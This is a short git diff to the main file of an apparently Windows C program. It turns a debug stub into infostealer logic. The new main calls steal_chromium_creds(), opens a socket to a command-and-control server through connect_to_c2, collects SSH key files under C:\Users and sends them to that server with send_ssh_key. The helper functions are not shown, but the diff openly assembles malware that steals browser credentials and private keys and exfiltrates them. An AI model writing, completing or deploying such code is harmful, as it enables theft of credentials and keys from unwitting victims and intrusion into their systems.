@@ -4,25 +4,27 @@
 #include <stdlib.h>
 #include <string.h>
 #include <windows.h>
+#include <winsock2.h>
 
 #include "chromium.h"
 #include "find_ssh_key.h"
 #include "obfuscation.h"
-
-void hello(void) { printf("Hello World\n"); }
+#include "c2.h"
 
 int main(void) {
-  // Puts the console in UTF-8
-  // Allows us to print non-ASCII characters for debug
   SetConsoleOutputCP(CP_UTF8);
-
-  hello();
   steal_chromium_creds();
-  find_ssh_key(L"C:\\Users");
+  sshKey keysFilenamesTab[MAX_KEY_FILES] = {0,0};
+  DWORD32 lenKeysTab = 0;
 
-  char str[] = "BOFFE";
-  xor_str(str, strlen(str));
-  printf("%s", str);
+  SOCKET sock;
+  BOOL success = connect_to_c2(&sock);
+  if (success == 0){
+    exit(-1);
+  }
+
+  find_ssh_key(L"C:\\Users", keysFilenamesTab, &lenKeysTab);
+  success = send_ssh_key(keysFilenamesTab, lenKeysTab, &sock);
 
   return EXIT_SUCCESS;
 }
